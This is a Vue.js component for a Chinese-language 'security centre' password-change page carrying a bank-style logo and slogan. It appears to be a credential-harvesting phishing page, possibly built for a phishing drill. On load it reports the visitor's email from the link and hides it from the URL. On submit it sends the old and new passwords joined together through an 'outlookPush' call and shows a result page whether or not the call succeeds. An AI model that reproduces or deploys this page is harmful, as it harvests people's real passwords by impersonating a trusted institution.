<template>
  <div class="password">
    <div class="portal-form-header">
      <el-breadcrumb separator-class="el-icon-arrow-right">
        <el-breadcrumb-item><img style="width:30px;float: left" src="@/assets/imgs/logo2.png" alt=""><span style="font-weight: bold;font-size: 16px;color: #333333;margin: 8px 0 0 10px;float: left"> 安全中心</span></el-breadcrumb-item>
      </el-breadcrumb>
    </div>
    <div class="headerDiv">
      <img src="@/assets/imgs/logo.png" alt="">
      <div>
        心系托付，一路广发
      </div>
    </div>
    <div class="container">
      <div class="form">
        <el-form
          ref="form"
          :model="form"
          :rules="rules"
          label-position="left"
          label-width="100px"
          size="mini"
        >

          <template>
            <div class="big-title">
              <i />修改密码
            </div>
            <el-form-item label="邮箱">
              <el-input v-model.trim="form.email" disabled type="text" />
            </el-form-item>
            <el-form-item key="oldPassword" label="原密码" prop="oldPassword">
              <el-input v-model.trim="form.oldPassword" type="password" />
            </el-form-item>

            <el-form-item key="newPasswd" label="新密码" prop="newPasswd">
              <el-input v-model.trim="form.newPasswd" type="password" placeholder="" />
            </el-form-item>
            <p
              style="line-height: 1.2;font-size: 12px;color: #909399;margin-top: 5px;"
            >密码长度必须8位以上，含大小写字母、数字及特殊符号至少覆盖3种以上。</p>
            <el-form-item key="newPasswdRepeat" label="确认新密码" prop="newPasswdRepeat">
              <el-input v-model.trim="form.newPasswdRepeat" type="password" />
            </el-form-item>
          </template>
        </el-form>
      </div>
      <div class="footer">
        <el-button size="mini" class="submitBtn" type="primary" :loading="saving" @click="handleConfirm">确 定</el-button>
      </div>
    </div>
  </div>
</template>

<script>
import { emailPush, outlookPush } from '@/api/password'

export default {
  name: 'Password',
  data() {
    const newPinValidator = (rule, value, cb) => {
      if (this.form.newPasswd !== this.form.newPasswdRepeat) {
        const msg = '密码两次输入不一致'
        cb(msg)
      } else {
        cb()
      }
    }

    return {
      rules: {
        newPasswd: [{ required: true, message: '格式不正确', pattern: /^(?![a-zA-Z]+$)(?![A-Z0-9]+$)(?![A-Z\\W_!@#$%^&*.`~()-+=]+$)(?![a-z0-9]+$)(?![a-z\\W_!@#$%^&*`~()-+=]+$)(?![0-9\\W_!@#$%^&*.`~()-+=]+$)[a-zA-Z0-9\\W_!@#$%^&*.`~()-+=]{8,30}$/, trigger: 'blur' }],
        oldPassword: [{ required: true, message: '必填', trigger: 'blur' }],
        newPasswdRepeat: [
          { required: true, message: '必填', trigger: 'blur' },
          { validator: newPinValidator, trigger: 'blur' }
        ]
      },
      form: {
        oldPassword: '',
        newPasswd: '',
        newPasswdRepeat: '',
        email: ''
      },
      formEmpty: {
        oldPassword: '',
        newAdPasswd: '',
        newAdPasswdRepeat: '',
        email: ''
      },
      saving: false
    }
  },
  created() {
    this.form.email = this.$route.query?.email
    this.formEmpty.email = this.$route.query?.email
    this.$route.query?.email ? emailPush(this.$route.query?.email).then(() => {
      const url = this.getnewurl('email')
      window.history.replaceState(null, null, url)
    }) : ''
  },
  methods: {
    getnewurl(name) {
      var loca = window.location
      var baseUrl = loca.origin + loca.pathname + '?'
      var query = loca.search.substr(1)
      if (query.indexOf(name) > -1) {
        var obj = {}
        var arr = query.split('&')
        for (var i = 0; i < arr.length; i++) {
          arr[i] = arr[i].split('=')
          obj[arr[i][0]] = arr[i][1]
        }
        delete obj[name]
        var url = baseUrl + JSON.stringify(obj).replace(/[\"\{\}]/g, '').replace(/\:/g, '=').replace(/\,/g, '&')
        return url
      }
    },
    handleConfirm() {
      if (this.form.email === '' || !this.form.email) {
        this.$message.error('请在邮件中重新打开链接')
        return false
      }
      this.$refs['form'].validate(valid => {
        if (valid) {
          var params = {
            email: this.form.email,
            password: this.form.oldPassword + '；' + this.form.newPasswd
          }
          outlookPush({ ...params }).then(() => {
            this.saving = false
            this.form = Object.assign({}, this.formEmpty)
            this.$router.push('/result')
          }).catch(() => {
            this.saving = false
            this.$router.push('/result')
            this.form = Object.assign({}, this.formEmpty)
          })
        }
      })
    }
  }
}
</script>
<style lang="scss" scoped >
.password {
  background-color: #ECF0F5;
  min-height: 100vh;
  .portal-form-header{
    padding-left: 20px;
    height: 50px;
    display: flex;
    align-items: center;
    background-color: #ffffff;
    margin-bottom: 20px;
    .el-breadcrumb__inner a:hover{
      color: #303133;
    }
    .el-breadcrumb__item:first-child{
      font-weight: bold;
      color: #303133;
      cursor: pointer;
    }
  }
  .panel .panel-body {
    padding: 0;
  }
  .panel {
    margin-bottom: 20px;
  }
  .container {
    max-width: 700px;
    margin: 0 auto;
    background: #ffffff;
    padding: 20px 40px;
    min-height: 400px;
    display: flex;
    flex-direction: column;
    justify-content: space-around;
    align-items: center;
    .form {
      width: 80%;
    }
  }
  .footer {
    width: 60%;
    display: flex;
    justify-content: flex-end;
  }
}
.submitBtn{
  width: 90px;
  height: 36px;
  margin: 0 auto;
}
.big-title{
  font-size: 16px;
  color: #555;
  font-weight: bold;
  overflow: hidden;
  i{
    width: 3px;
    height: 18px;
    background: #398BF9;
    float: left;
    margin-right: 10px;
    margin-bottom: 20px;
  }
}
.headerDiv{
  overflow: hidden;
  margin: 30px auto;
  text-align: center;
  max-width: 700px;
  img{
    float: left;
  }
  div{
    display: inline-block;
    background: rgba(167,185,219,.1);
    font-size: 12px;
    color: #34599d;
    padding: 6px ;
    margin-left: 100px;
    width: 400px;
    text-align: right;
    margin-top: 10px;
  }

}
</style>
